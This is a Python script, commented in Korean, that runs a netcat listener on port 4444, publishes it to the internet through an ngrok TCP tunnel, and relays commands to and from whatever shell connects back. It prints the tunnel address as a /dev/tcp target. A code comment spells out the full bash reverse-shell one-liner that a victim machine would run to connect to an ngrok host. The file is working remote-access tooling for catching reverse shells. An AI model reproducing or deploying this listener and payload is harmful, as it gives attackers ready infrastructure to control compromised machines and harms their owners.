import re
import subprocess
import threading
import sys
import time

def main():
    # nc, ngrok PATH 설정 필요
    nc = subprocess.Popen(
        ["nc", "-nlvp", "4444"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    ngrok = subprocess.Popen(
        ["ngrok", "tcp", "4444", "--log", "stdout"],
        stdout = subprocess.PIPE,
        stderr = subprocess.STDOUT,
        text = True,
        bufsize = 1,
    )

    for line in ngrok.stdout:
        m = re.search(r"tcp://([^\s]+)", line)
        if m:
            print("ngrok Public Address :", m.group(1))
            print("Reverse Shell bash tcp socket : /dev/tcp/" + "/".join(m.group(1).split(":")))
            # ex) bash -i >&(표준출력 1, 표준에러 2 소켓으로 보냄) /dev/tcp/0.tcp.jp.ngrok.io/12707 0>&1 (표준입력 0을 표준 출력 1이 가는 곳으로 보내기)
            print("ngrok Dashboard : 127.0.0.1:4040")
            break


    def read_output():
        while True:
            try:
                line = nc.stdout.readline()
                if not line:
                    break
                print(line, end="")
                sys.stdout.flush()
            except:
                break

    def write_input():
        while True:
            try:
                cmd = sys.stdin.readline()
                if not cmd:
                    break
                nc.stdin.write(cmd)
                nc.stdin.flush()
            except:
                break

    try:
        # 읽기, 쓰기 쓰레드
        read_thread = threading.Thread(target=read_output, daemon=True)
        write_thread = threading.Thread(target=write_input, daemon=True)

        read_thread.start()
        write_thread.start()

        while True:
            time.sleep(0.5)
            # nc가 종료 시
            if nc.poll() is not None:  
                print("nc Process terminate...")
                break
    except KeyboardInterrupt:
        print("Interrupt... Wait for Exit...")
    finally:
        nc.terminate()
        ngrok.terminate()

if __name__ == "__main__":
    main()
